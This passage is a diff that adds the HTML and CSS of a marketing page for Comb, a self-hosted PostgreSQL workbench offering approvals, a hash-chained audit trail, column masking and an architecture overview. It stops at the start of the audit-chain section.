@@ -1,0 +1,801 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="description" content="Comb is a free, self-hosted PostgreSQL workbench with approvals, a tamper-evident audit trail, column masking, monitoring and backups.">
+<title>Comb for PostgreSQL</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Schibsted+Grotesk:wght@500;700;800&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500;600&display=swap">
+<style>
+/* Layout: a console-like spine. Full-width bands, a 1120px column, monospace for anything the database would say. */
+:root {
+  --bg: #f2f5f4; --panel: #ffffff; --sunk: #e7eeec; --line: #d3dedb; --fg: #11201e; --muted: #556866;
+  --accent: #0d8a74; --accent-ink: #ffffff; --accent-soft: #d3efe8;
+  --warn: #a8670f; --warn-soft: #f6e6cc; --stop: #b93a55; --stop-soft: #f5d9df; --info: #3c63b8; --info-soft: #dbe4f6;
+  --shadow: 0 1px 2px rgb(17 32 30 / 0.06), 0 8px 24px rgb(17 32 30 / 0.06);
+  --display: "Schibsted Grotesk", "Helvetica Neue", Arial, sans-serif;
+  --body: "IBM Plex Sans", "Segoe UI", system-ui, sans-serif;
+  --mono: "IBM Plex Mono", ui-monospace, "SFMono-Regular", Menlo, monospace;
+  --col: 1120px;
+}
+@media (prefers-color-scheme: dark) { :root:not([data-theme="light"]) {
+  --bg: #0c1416; --panel: #121d20; --sunk: #0f181a; --line: #223336; --fg: #e3ecea; --muted: #8ea3a1;
+  --accent: #3fd1b4; --accent-ink: #062520; --accent-soft: #123a34;
+  --warn: #f0b955; --warn-soft: #3a2c12; --stop: #f07a92; --stop-soft: #3d1a22; --info: #8cabf2; --info-soft: #1a2643;
+  --shadow: 0 1px 2px rgb(0 0 0 / 0.3), 0 10px 30px rgb(0 0 0 / 0.25); color-scheme: dark } }
+:root[data-theme="dark"] {
+  --bg: #0c1416; --panel: #121d20; --sunk: #0f181a; --line: #223336; --fg: #e3ecea; --muted: #8ea3a1;
+  --accent: #3fd1b4; --accent-ink: #062520; --accent-soft: #123a34;
+  --warn: #f0b955; --warn-soft: #3a2c12; --stop: #f07a92; --stop-soft: #3d1a22; --info: #8cabf2; --info-soft: #1a2643;
+  --shadow: 0 1px 2px rgb(0 0 0 / 0.3), 0 10px 30px rgb(0 0 0 / 0.25); color-scheme: dark }
+
+* { box-sizing: border-box }
+html { color-scheme: light } body { margin: 0; background: var(--bg); color: var(--fg); font-family: var(--body); font-size: 16px; line-height: 1.6; -webkit-font-smoothing: antialiased }
+.band { padding-left: max(16px, env(safe-area-inset-left, 0px)); padding-right: max(16px, env(safe-area-inset-right, 0px)); padding-block: 88px }
+.band.tight { padding-block: 56px }
+.band.alt { background: var(--sunk); border-block: 1px solid var(--line) }
+.wrap { max-width: var(--col); margin: 0 auto; display: flex; flex-direction: column; gap: 40px }
+h1, h2, h3 { font-family: var(--display); text-wrap: balance; margin: 0; letter-spacing: -0.02em }
+h1 { font-size: clamp(40px, 6.2vw, 72px); line-height: 1.02; font-weight: 800 }
+h2 { font-size: clamp(30px, 3.8vw, 44px); line-height: 1.08; font-weight: 700 }
+h3 { font-size: 20px; line-height: 1.25; font-weight: 700; letter-spacing: -0.01em }
+p { margin: 0; max-width: 65ch }
+.lede { font-size: 19px; color: var(--muted); max-width: 60ch }
+.eyebrow { font-family: var(--mono); font-size: 12px; letter-spacing: 0.12em; text-transform: uppercase; color: var(--accent); font-weight: 600 }
+.head { display: flex; flex-direction: column; gap: 14px }
+.mono { font-family: var(--mono) }
+code, .code { font-family: var(--mono); font-size: 0.9em }
+:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; border-radius: 3px }
+.tnum { font-variant-numeric: tabular-nums }
+
+/* Top bar */
+.topbar { position: sticky; top: env(safe-area-inset-top, 0px); z-index: 20; background: color-mix(in srgb, var(--bg) 88%, transparent); backdrop-filter: blur(10px); border-bottom: 1px solid var(--line);
+  padding-left: max(16px, env(safe-area-inset-left, 0px)); padding-right: max(16px, env(safe-area-inset-right, 0px)) }
+body::before { content: ""; position: fixed; inset: 0 0 auto; height: env(safe-area-inset-top, 0px); z-index: 10; background: var(--bg) }
+.topbar .in { max-width: var(--col); margin: 0 auto; height: 56px; display: flex; align-items: center; gap: 24px }
+.brand { display: flex; align-items: center; gap: 10px; font-family: var(--display); font-weight: 800; font-size: 20px; letter-spacing: -0.02em; color: var(--fg); text-decoration: none }
+.nav { display: flex; gap: 20px; margin-left: auto; font-size: 14px }
+.nav a { color: var(--muted); text-decoration: none }
+.nav a:hover { color: var(--fg) }
+@media (max-width: 760px) { .nav { display: none } }
+
+/* Comb mark: four cells that fill in turn */
+.mark { width: 22px; height: 22px; display: grid; grid-template-columns: 1fr 1fr; gap: 2px; flex: none }
+.mark i { background: var(--fg); border-radius: 1px; animation: cell 3.2s infinite }
+.mark i:nth-child(2) { animation-delay: .4s } .mark i:nth-child(3) { animation-delay: 1.2s } .mark i:nth-child(4) { animation-delay: .8s }
+@keyframes cell { 0%, 70%, 100% { background: var(--fg) } 35% { background: var(--accent) } }
+
+/* Hero */
+.hero { display: grid; grid-template-columns: minmax(0, 1.05fr) minmax(0, 1fr); gap: 56px; align-items: center }
+@media (max-width: 920px) { .hero { grid-template-columns: minmax(0, 1fr); gap: 40px } }
+.hero-copy { display: flex; flex-direction: column; gap: 24px; min-width: 0 }
+.hero h1 em { font-style: normal; color: var(--accent) }
+.pills { display: flex; flex-wrap: wrap; gap: 8px }
+.pill { font-family: var(--mono); font-size: 12.5px; padding: 5px 10px; border: 1px solid var(--line); border-radius: 999px; color: var(--fg); background: var(--panel) }
+.pill b { color: var(--accent); font-weight: 600 }
+
+.console { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; box-shadow: var(--shadow); overflow: hidden; min-width: 0 }
+.console-top { display: flex; align-items: center; gap: 10px; padding: 10px 14px; border-bottom: 1px solid var(--line); font-family: var(--mono); font-size: 12px; color: var(--muted) }
+.console-top .env { padding: 1px 7px; border-radius: 3px; font-weight: 600; letter-spacing: .04em }
+.env-prod { background: var(--stop-soft); color: var(--stop) } .env-dev { background: var(--info-soft); color: var(--info) }
+.console-top .spacer { flex: 1 }
+.sql { font-family: var(--mono); font-size: 14.5px; line-height: 1.55; padding: 18px 18px 6px; min-height: 92px; white-space: pre-wrap; word-break: break-word }
+.sql .kw { color: var(--accent); font-weight: 500 } .sql .caret { display: inline-block; width: 8px; height: 17px; background: var(--fg); vertical-align: -3px; animation: blink 1s steps(1) infinite }
+@keyframes blink { 50% { opacity: 0 } }
+.steps { list-style: none; margin: 0; padding: 6px 18px 18px; display: grid; gap: 4px }
+.steps li { display: grid; grid-template-columns: 20px 1fr auto; gap: 10px; align-items: center; font-size: 13.5px; padding: 6px 8px; border-radius: 5px; color: var(--muted); transition: background .25s, color .25s }
+.steps li .dot { width: 9px; height: 9px; border-radius: 50%; border: 1.5px solid var(--line); justify-self: center; transition: all .25s }
+.steps li .r { font-family: var(--mono); font-size: 12px }
+.steps li.pass { color: var(--fg) } .steps li.pass .dot { background: var(--accent); border-color: var(--accent) }
+.steps li.skip { opacity: .45 }
+.steps li.stop { background: var(--stop-soft); color: var(--stop); font-weight: 500 } .steps li.stop .dot { background: var(--stop); border-color: var(--stop) }
+.steps li.hold { background: var(--warn-soft); color: var(--warn); font-weight: 500 } .steps li.hold .dot { background: var(--warn); border-color: var(--warn) }
+.steps li.go { background: var(--accent-soft); color: var(--accent); font-weight: 500 } .steps li.go .dot { background: var(--accent); border-color: var(--accent) }
+.verdict { margin: 0 18px 18px; padding: 12px 14px; border-radius: 6px; font-size: 14px; display: flex; gap: 12px; align-items: flex-start; border: 1px solid var(--line); min-height: 66px }
+.verdict .tag { font-family: var(--mono); font-size: 11.5px; font-weight: 600; letter-spacing: .06em; padding: 3px 8px; border-radius: 3px; flex: none; text-transform: uppercase }
+.v-go .tag { background: var(--accent); color: var(--accent-ink) } .v-stop .tag { background: var(--stop); color: var(--panel) } .v-hold .tag { background: var(--warn); color: var(--panel) }
+.stamp { animation: stamp .45s cubic-bezier(.2,1.6,.4,1) }
+@keyframes stamp { from { transform: scale(.94); opacity: .3 } }
+
+/* Numbers */
+.stats { display: grid; grid-template-columns: repeat(5, minmax(0, 1fr)); gap: 1px; background: var(--line); border: 1px solid var(--line); border-radius: 10px; overflow: hidden }
+@media (max-width: 860px) { .stats { grid-template-columns: repeat(2, minmax(0, 1fr)) } .stats > :last-child { grid-column: 1 / -1 } }
+.stat { background: var(--panel); padding: 22px 20px; display: flex; flex-direction: column; gap: 4px; min-width: 0 }
+.stat .n { font-family: var(--display); font-weight: 800; font-size: clamp(32px, 4vw, 44px); line-height: 1; letter-spacing: -0.03em; font-variant-numeric: tabular-nums }
+.stat .l { font-size: 14px; color: var(--muted) }
+
+/* Principles */
+.grid4 { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 28px }
+@media (max-width: 960px) { .grid4 { grid-template-columns: repeat(2, minmax(0, 1fr)) } }
+@media (max-width: 560px) { .grid4 { grid-template-columns: minmax(0, 1fr) } }
+.principle { display: flex; flex-direction: column; gap: 10px; padding-top: 18px; border-top: 2px solid var(--fg); min-width: 0 }
+.principle .k { font-family: var(--mono); font-size: 12px; color: var(--muted) }
+.principle p { color: var(--muted); font-size: 15px }
+
+/* Simulator */
+.sim { display: grid; grid-template-columns: 340px minmax(0, 1fr); gap: 24px; align-items: start }
+@media (max-width: 900px) { .sim { grid-template-columns: minmax(0, 1fr) } }
+.controls { display: flex; flex-direction: column; gap: 22px; min-width: 0 }
+.field { display: flex; flex-direction: column; gap: 8px; border: 0; padding: 0; margin: 0; min-width: 0 }
+.field legend, .field .lab { font-family: var(--mono); font-size: 12px; letter-spacing: .1em; text-transform: uppercase; color: var(--muted); padding: 0; margin-bottom: 8px }
+.seg { display: flex; flex-wrap: wrap; gap: 6px }
+.seg input { position: absolute; opacity: 0; pointer-events: none }
+.seg label { cursor: pointer; padding: 7px 11px; border: 1px solid var(--line); border-radius: 6px; font-size: 14px; background: var(--panel); transition: border-color .15s, background .15s }
+.seg label:hover { border-color: var(--muted) }
+.seg input:checked + label { border-color: var(--accent); background: var(--accent-soft); color: var(--fg); font-weight: 500 }
+.seg input:focus-visible + label { outline: 2px solid var(--accent); outline-offset: 2px }
+.stmts { display: flex; flex-direction: column; gap: 6px }
+.stmts label { font-family: var(--mono); font-size: 12.5px; border-radius: 6px; padding: 8px 10px; line-height: 1.4; word-break: break-word }
+
+/* Screens */
+.tabs { display: flex; gap: 4px; flex-wrap: wrap; border-bottom: 1px solid var(--line) }
+.tab { appearance: none; border: 0; background: none; color: var(--muted); font: 500 14px var(--body); padding: 10px 14px; cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -1px }
+.tab[aria-selected="true"] { color: var(--fg); border-color: var(--accent) }
+.tab:hover { color: var(--fg) }
+.shot { display: grid; grid-template-columns: minmax(0, 1fr) 280px; gap: 28px; align-items: start }
+@media (max-width: 900px) { .shot { grid-template-columns: minmax(0, 1fr) } }
+.frame { border: 1px solid var(--line); border-radius: 10px; overflow: hidden; box-shadow: var(--shadow); background: #0c1416; aspect-ratio: 1440 / 860; max-width: 100% }
+.frame img { display: block; width: 100%; height: 100%; object-fit: cover; animation: fade .5s ease }
+@keyframes fade { from { opacity: .2; transform: scale(1.01) } }
+.shot-copy { display: flex; flex-direction: column; gap: 14px; min-width: 0 }
+.shot-copy ul { margin: 0; padding-left: 18px; color: var(--muted); font-size: 15px; display: flex; flex-direction: column; gap: 6px }
+
+/* Module map */
+.map { display: grid; grid-template-columns: repeat(5, minmax(0, 1fr)); gap: 16px }
+@media (max-width: 980px) { .map { grid-template-columns: repeat(2, minmax(0, 1fr)) } }
+@media (max-width: 520px) { .map { grid-template-columns: minmax(0, 1fr) } }
+.group { display: flex; flex-direction: column; gap: 8px; min-width: 0 }
+.group h3 { font-size: 15px; display: flex; justify-content: space-between; align-items: baseline; padding-bottom: 8px; border-bottom: 1px solid var(--line) }
+.group h3 span { font-family: var(--mono); font-size: 12px; color: var(--muted); font-weight: 500 }
+.mod { position: relative; background: var(--panel); border: 1px solid var(--line); border-radius: 6px; padding: 10px 12px; font-size: 14px; font-weight: 500; cursor: default; transition: transform .2s, border-color .2s }
+.mod small { display: block; font-weight: 400; color: var(--muted); font-size: 12.5px; line-height: 1.4; margin-top: 2px }
+.mod:hover { transform: translateY(-2px); border-color: var(--accent) }
+.map.play .mod { animation: pop .5s backwards cubic-bezier(.2,1.3,.4,1); animation-delay: calc(var(--i) * 35ms) }
+@keyframes pop { from { transform: translateY(8px) scale(.97); opacity: .25 } }
+
+/* Architecture */
+.arch { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 16px; overflow-x: auto }
+.arch svg { display: block; min-width: 760px; width: 100%; height: auto }
+.arch .box { fill: var(--sunk); stroke: var(--line); stroke-width: 1.2 }
+.arch .core { fill: var(--accent-soft); stroke: var(--accent); stroke-width: 1.4 }
+.arch text { fill: var(--fg); font-family: var(--body); font-size: 13px }
+.arch .t { font-family: var(--display); font-weight: 700; font-size: 15px }
+.arch .s { fill: var(--muted); font-size: 11.5px; font-family: var(--mono) }
+.arch .wire { fill: none; stroke: var(--line); stroke-width: 2 }
+.arch .flow { fill: none; stroke: var(--accent); stroke-width: 2; stroke-dasharray: 4 10; animation: flow 1.2s linear infinite }
+.arch .flow.slow { animation-duration: 2.4s; stroke: var(--info) }
+@keyframes flow { to { stroke-dashoffset: -28 } }
+.facts { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 28px }
+@media (max-width: 860px) { .facts { grid-template-columns: minmax(0, 1fr) } }
+.facts div { display: flex; flex-direction: column; gap: 6px; min-width: 0 }
+.facts p { color: var(--muted); font-size: 15px }
+
+/* Audit chain */
+.chain { display: flex; gap: 0; overflow-x: auto; padding: 6px 2px 14px }
+.blk { flex: 0 0 196px; background: var(--panel); border: 1px solid var(--line); border-radius: 8px; padding: 12px; display: flex; flex-direction: column; gap: 6px; font-size: 13px; transition: border-color .3s, background .3s }
+.blk .no { font-family: var(--mono); font-size: 11.5px; color: var(--muted); display: flex; justify-content: space-between }
+.blk .ev { font-weight: 500; min-height: 40px; line-height: 1.4 }
+.blk .h { font-family: var(--mono); font-size: 11px; color: var(--muted); word-break: break-all }
+.blk .h b { color: var(--fg); font-weight: 500 }
+.blk.bad { border-color: var(--stop); background: var(--stop-soft) }
+.blk.bad .h b { color: var(--stop) }
+.blk.edited .ev { color: var(--stop); text-decoration: underline wavy; text-underline-offset: 3px }
+.link { flex: 0 0 28px; align-self: center; height: 2px; background: var(--accent); position: relative }
+.link.broken { background: repeating-linear-gradient(90deg, var(--stop) 0 4px, transparent 4px 8px) }
+.chain-bar { display: flex; flex-wrap: wrap; gap: 10px; align-items: center }
+.btn { appearance: none; font: 500 14px var(--body); padding: 9px 14px; border-radius: 6px; border: 1px solid var(--line); background: var(--panel); color: var(--fg); cursor: pointer }
+.btn:hover { border-color: var(--muted) }
+.btn.primary { background: var(--accent); border-color: var(--accent); color: var(--accent-ink) }
+.status { font-family: var(--mono); font-size: 13px; padding: 6px 10px; border-radius: 5px }
+.status.ok { background: var(--accent-soft); color: var(--accent) } .status.bad { background: var(--stop-soft); color: var(--stop) }
+
+/* Roles */
+.tablewrap { overflow-x: auto; border: 1px solid var(--line); border-radius: 10px; background: var(--panel) }
+table { border-collapse: collapse; width: 100%; min-width: 640px; font-size: 14.5px }
+th, td { text-align: left; padding: 12px 16px; border-bottom: 1px solid var(--line); vertical-align: top }
+th { font-family: var(--mono); font-size: 11.5px; letter-spacing: .08em; text-transform: uppercase; color: var(--muted); font-weight: 500 }
+tr:last-child td { border-bottom: 0 }
+td.role { font-weight: 600; white-space: nowrap }
+.lvl { font-family: var(--mono); font-size: 12px; padding: 2px 7px; border-radius: 3px; white-space: nowrap }
+.l-admin { background: var(--accent-soft); color: var(--accent) } .l-write { background: var(--info-soft); color: var(--info) } .l-read { background: var(--warn-soft); color: var(--warn) } .l-none { background: var(--sunk); color: var(--muted) }
+
+/* Charts */
+.charts { display: grid; grid-template-columns: minmax(0, 1.25fr) minmax(0, 1fr); gap: 24px }
+@media (max-width: 900px) { .charts { grid-template-columns: minmax(0, 1fr) } }
+.card { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 22px; display: flex; flex-direction: column; gap: 16px; min-width: 0 }
+.card .cap { font-size: 13.5px; color: var(--muted) }
+.bars { display: flex; flex-direction: column; gap: 8px }
+.bar { display: grid; grid-template-columns: 82px minmax(0, 1fr) 36px; gap: 10px; align-items: center; font-size: 13px }
+.bar .nm { font-family: var(--mono); color: var(--muted) }
+.bar .tr { height: 14px; background: var(--sunk); border-radius: 3px; overflow: hidden }
+.bar .fl { height: 100%; background: var(--accent); border-radius: 3px; transform-origin: left }
+.bar .v { font-family: var(--mono); text-align: right; font-variant-numeric: tabular-nums }
+.bars.play .fl { animation: grow 1s backwards cubic-bezier(.2,.9,.3,1); animation-delay: calc(var(--i) * 60ms) }
+@keyframes grow { from { transform: scaleX(0) } }
+.stack { display: flex; height: 28px; border-radius: 5px; overflow: hidden; gap: 2px }
+.stack div { height: 100%; transform-origin: left }
+.stack.play div { animation: grow .9s backwards cubic-bezier(.2,.9,.3,1) }
+.legend { display: flex; flex-wrap: wrap; gap: 14px; font-size: 13px; color: var(--muted) }
+.legend i { display: inline-block; width: 10px; height: 10px; border-radius: 2px; margin-right: 6px; vertical-align: -1px }
+.timeline svg { width: 100%; height: auto; display: block; overflow: visible }
+.timeline text { fill: var(--muted); font-family: var(--mono); font-size: 11px }
+.timeline .ttl { fill: var(--fg); font-family: var(--body); font-size: 12.5px; font-weight: 600 }
+
+/* Deploy */
+.deploy { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 24px }
+@media (max-width: 860px) { .deploy { grid-template-columns: minmax(0, 1fr) } }
+.codebox { position: relative; background: var(--sunk); border: 1px solid var(--line); border-radius: 8px; min-width: 0 }
+.codebox pre { margin: 0; padding: 16px; overflow-x: auto; font-family: var(--mono); font-size: 13px; line-height: 1.6 }
+.codebox .copy { position: absolute; top: 8px; right: 8px; font: 500 12px var(--mono); padding: 4px 8px; border-radius: 4px; border: 1px solid var(--line); background: var(--panel); color: var(--muted); cursor: pointer }
+.codebox .copy:hover { color: var(--fg) }
+.req { display: grid; grid-template-columns: auto minmax(0, 1fr); gap: 8px 18px; font-size: 14.5px; margin: 0 }
+.req dt { font-family: var(--mono); font-size: 13px; color: var(--muted) }
+.req dd { margin: 0 }
+
+.audience { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 24px }
+@media (max-width: 860px) { .audience { grid-template-columns: minmax(0, 1fr) } }
+.aud { border: 1px solid var(--line); border-radius: 10px; padding: 26px; background: var(--panel); display: flex; flex-direction: column; gap: 14px; min-width: 0 }
+.aud ul { margin: 0; padding: 0; list-style: none; display: flex; flex-direction: column; gap: 10px }
+.aud li { display: grid; grid-template-columns: 18px minmax(0, 1fr); gap: 10px; font-size: 15px }
+.aud li::before { content: ""; width: 8px; height: 8px; margin-top: 8px; border-radius: 2px; background: var(--accent) }
+
+footer { font-size: 13.5px; color: var(--muted) }
+footer .wrap { flex-direction: row; flex-wrap: wrap; justify-content: space-between; gap: 12px }
+
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after { animation: none !important; transition: none !important }
+}
+</style>
+</head>
+<body>
+
+
+<header class="topbar">
+  <div class="in">
+    <a class="brand" href="#top"><span class="mark" aria-hidden="true"><i></i><i></i><i></i><i></i></span>Comb</a>
+    <nav class="nav" aria-label="Sections">
+      <a href="#policy">Safety</a><a href="#screens">Screens</a><a href="#modules">Modules</a><a href="#architecture">Architecture</a><a href="#audit">Audit</a><a href="#deploy">Deploy</a>
+    </nav>
+  </div>
+</header>
+
+<main id="top">
+  <!-- Hero -->
+  <section class="band">
+    <div class="wrap">
+      <div class="hero">
+        <div class="hero-copy">
+          <span class="eyebrow">Self-hosted PostgreSQL workbench</span>
+          <h1>The SQL client you can safely <em>open on production</em>.</h1>
+          <p class="lede">Comb puts a query editor, data grid and ERD next to the tools a team needs around real databases: approvals, a tamper-evident audit trail, column masking, monitoring, backups and access control. The server checks every statement before the database sees it.</p>
+          <div class="pills">
+            <span class="pill"><b>Free</b> · no license, no seat limit</span>
+            <span class="pill">Runs in your infrastructure</span>
+            <span class="pill">Never phones home</span>
+            <span class="pill">PostgreSQL 13–17</span>
+          </div>
+        </div>
+        <div class="console" aria-label="Live example of Comb checking SQL statements" aria-live="polite">
+          <div class="console-top"><span class="mark" aria-hidden="true" style="width:14px;height:14px"><i></i><i></i><i></i><i></i></span><span id="h-conn">shop_prod</span><span class="env" id="h-env">PROD</span><span class="spacer"></span><span id="h-who">analyst · write</span></div>
+          <div class="sql" id="h-sql"></div>
+          <ol class="steps" id="h-steps"></ol>
+          <div class="verdict" id="h-verdict"><span class="tag">…</span><span>Waiting for a statement.</span></div>
+        </div>
+      </div>
+      <div class="stats" id="stats">
+        <div class="stat"><span class="n" data-count="21">21</span><span class="l">screens, from the grid to compliance</span></div>
+        <div class="stat"><span class="n" data-count="188">188</span><span class="l">API routes, each enforced on the server</span></div>
+        <div class="stat"><span class="n" data-count="639">639</span><span class="l">automated checks passing</span></div>
+        <div class="stat"><span class="n" data-count="8">8</span><span class="l">policy steps per statement</span></div>
+        <div class="stat"><span class="n" data-count="0" data-prefix="€">€0</span><span class="l">license cost, now and later</span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Principles -->
+  <section class="band tight alt">
+    <div class="wrap">
+      <div class="grid4">
+        <div class="principle"><span class="k">principle 1</span><h3>Safe on production by default</h3><p>Read-only connections, typed confirmation for DROP and TRUNCATE, and a second person for writes where you require it.</p></div>
+        <div class="principle"><span class="k">principle 2</span><h3>The server decides</h3><p>Every rule is enforced in the Comb server. The browser only shows what the server already allows.</p></div>
+        <div class="principle"><span class="k">principle 3</span><h3>Every action is recorded</h3><p>The audit trail is append-only and hash-chained, so a changed or deleted row is detectable.</p></div>
+        <div class="principle"><span class="k">principle 4</span><h3>Credentials stay server-side</h3><p>Passwords, SSH keys and tokens are encrypted at rest with AES-256-GCM and never sent to the browser.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Policy simulator -->
+  <section class="band" id="policy">
+    <div class="wrap">
+      <div class="head">
+        <span class="eyebrow">Try the policy engine</span>
+        <h2>Pick a connection, an access level and a statement.</h2>
+        <p class="lede">Comb parses every statement with the real PostgreSQL parser, then walks it through the same eight checks in the same order, every time. This simulator follows the server's own rules.</p>
+      </div>
+      <div class="sim">
+        <div class="controls">
+          <fieldset class="field"><legend>Connection</legend>
+            <div class="seg" id="s-conn">
+              <input type="radio" name="conn" id="c-dev" value="dev" checked><label for="c-dev">shop_dev</label>
+              <input type="radio" name="conn" id="c-ro" value="ro"><label for="c-ro">shop_prod · read-only</label>
+              <input type="radio" name="conn" id="c-ap" value="ap"><label for="c-ap">shop_prod · approvals</label>
+            </div>
+          </fieldset>
+          <fieldset class="field"><legend>Your access</legend>
+            <div class="seg" id="s-lvl">
+              <input type="radio" name="lvl" id="l-read" value="read"><label for="l-read">read</label>
+              <input type="radio" name="lvl" id="l-write" value="write" checked><label for="l-write">write</label>
+              <input type="radio" name="lvl" id="l-admin" value="admin"><label for="l-admin">admin</label>
+            </div>
+          </fieldset>
+          <fieldset class="field"><legend>Statement</legend>
+            <div class="seg stmts" id="s-stmt"></div>
+          </fieldset>
+        </div>
+        <div class="console" aria-live="polite">
+          <div class="console-top"><span id="s-conname">shop_dev</span><span class="env env-dev" id="s-env">DEV</span><span class="spacer"></span><span id="s-who">write access</span></div>
+          <div class="sql" id="s-sql"></div>
+          <ol class="steps" id="s-steps"></ol>
+          <div class="verdict" id="s-verdict"></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Screens -->
+  <section class="band alt" id="screens">
+    <div class="wrap">
+      <div class="head">
+        <span class="eyebrow">The workbench</span>
+        <h2>Fast for developers. Keyboard first.</h2>
+        <p class="lede">These are real screens from a local install on the bundled <span class="mono">shop</span> demo database.</p>
+      </div>
+      <div class="tabs" role="tablist" id="tabs"></div>
+      <div class="shot">
+        <div class="frame"><img id="shot-img" alt=""></div>
+        <div class="shot-copy"><h3 id="shot-title"></h3><p id="shot-text" style="color:var(--muted);font-size:15px"></p><ul id="shot-list"></ul></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Modules -->
+  <section class="band" id="modules">
+    <div class="wrap">
+      <div class="head">
+        <span class="eyebrow">Everything around the database</span>
+        <h2>One tool instead of six.</h2>
+        <p class="lede">Teams usually stitch together a SQL client, a migration tool, a scheduler, a monitoring dashboard, an audit export and a spreadsheet of who has access. Comb ships all of it, sharing one permission model and one audit trail.</p>
+      </div>
+      <div class="map" id="map"></div>
+    </div>
+  </section>
+
+  <!-- Audience -->
+  <section class="band tight alt">
+    <div class="wrap">
+      <div class="audience">
+        <div class="aud">
+          <span class="eyebrow">For developers</span>
+          <h3>Gets out of your way</h3>
+          <ul>
+            <li><span><b>⌘K</b> jumps to any table, saved query or screen. <b>⌘↵</b> runs the statement under the cursor.</span></li>
+            <li><span>Grid edits are staged, shown as SQL, then applied in one transaction.</span></li>
+            <li><span>Autocomplete from the live catalog, error positions, notices and CSV export.</span></li>
+            <li><span>Versioned migrations with dry runs, drift detection and rollbacks.</span></li>
+            <li><span>Cron-scheduled SQL with retries, delivered to Slack, Teams or a webhook.</span></li>
+          </ul>
+        </div>
+        <div class="aud">
+          <span class="eyebrow">For managers and security</span>
+          <h3>Answers "who did what" in seconds</h3>
+          <ul>
+            <li><span>Every statement, login and change, with before and after row images for writes.</span></li>
+            <li><span>Four-eyes approvals on the connections you choose, with a rolled-back dry run first.</span></li>
+            <li><span>PII classification and server-side masking on results, exports and the audit trail.</span></li>
+            <li><span>Compliance controls with evidence, data-subject requests and retention policies.</span></li>
+            <li><span>Usage and cost by team, with a chargeback CSV.</span></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Architecture -->
+  <section class="band" id="architecture">
+    <div class="wrap">
+      <div class="head">
+        <span class="eyebrow">How it works</span>
+        <h2>One process, one metadata database, nothing else to run.</h2>
+      </div>
+      <div class="arch">
+        <svg viewBox="0 0 980 380" role="img" aria-label="Architecture: browser to Comb server to target databases and services; Comb server stores its data in a metadata database">
+          <path class="wire" d="M200 150 H330"/><path class="flow" d="M200 150 H330"/>
+          <path class="wire" d="M650 110 H770"/><path class="flow" d="M650 110 H770"/>
+          <path class="wire" d="M650 190 H770"/><path class="flow slow" d="M650 190 H770"/>
+          <path class="wire" d="M650 270 H770"/><path class="flow slow" d="M650 270 H770"/>
+          <path class="wire" d="M490 290 V320"/><path class="flow slow" d="M490 290 V320"/>
+
+          <rect class="box" x="20" y="90" width="180" height="120" rx="8"/>
+          <text class="t" x="38" y="122">Browser</text>
+          <text x="38" y="148">grid · editor · ERD</text>
+          <text class="s" x="38" y="172">React single-page app</text>
+          <text class="s" x="38" y="190">no credentials, ever</text>
+          <text class="s" x="224" y="128">HTTPS</text><text class="s" x="224" y="142">WebSocket</text>
+
+          <rect class="core" x="330" y="40" width="320" height="250" rx="10"/>
+          <text class="t" x="352" y="72">Comb server</text>
+          <text class="s" x="352" y="92">Node.js · Fastify · one process</text>
+          <g>
+            <rect class="box" x="352" y="108" width="132" height="34" rx="5"/><text x="364" y="130">SQL parser</text>
+            <rect class="box" x="496" y="108" width="132" height="34" rx="5"/><text x="508" y="130">Policy engine</text>
+            <rect class="box" x="352" y="152" width="132" height="34" rx="5"/><text x="364" y="174">Approvals</text>
+            <rect class="box" x="496" y="152" width="132" height="34" rx="5"/><text x="508" y="174">Masking</text>
+            <rect class="box" x="352" y="196" width="132" height="34" rx="5"/><text x="364" y="218">Audit chain</text>
+            <rect class="box" x="496" y="196" width="132" height="34" rx="5"/><text x="508" y="218">Secret vault</text>
+            <rect class="box" x="352" y="240" width="276" height="34" rx="5"/><text x="364" y="262">Background jobs · pg-boss</text>
+          </g>
+
+          <rect class="box" x="770" y="82" width="190" height="56" rx="8"/><text class="t" x="786" y="106">Your PostgreSQL</text><text class="s" x="786" y="126">direct or SSH tunnel</text>
+          <rect class="box" x="770" y="162" width="190" height="56" rx="8"/><text class="t" x="786" y="186">Patroni · pgBackRest</text><text class="s" x="786" y="206">optional</text>
+          <rect class="box" x="770" y="242" width="190" height="56" rx="8"/><text class="t" x="786" y="266">Slack · Teams · SSO</text><text class="s" x="786" y="286">behind an SSRF guard</text>
+
+          <rect class="box" x="370" y="320" width="240" height="50" rx="8"/><text class="t" x="388" y="343">Metadata database</text><text class="s" x="388" y="361">users, audit, jobs, saved queries</text>
+        </svg>
+      </div>
+      <div class="facts">
+        <div><h3>No broker, no cache</h3><p>Background work runs on pg-boss, a queue stored in the metadata database. There is no Redis to operate.</p></div>
+        <div><h3>A real parser, not regexes</h3><p>Statements are classified with libpg-query, PostgreSQL's own parser. Comments, quoting or casing tricks can't slip a DROP past it.</p></div>
+        <div><h3>Your database role is the ceiling</h3><p>Comb only narrows what the stored database user may do, never widens it. Give each connection a least-privilege role.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Audit chain -->
+  <section class="band alt" id="audit">
+    <div class="wrap">
+      <div class="head">
+        <span class="eyebrow">Tamper-evident audit trail</span>
+        <h2>Change one row, and the chain shows it.</h2>
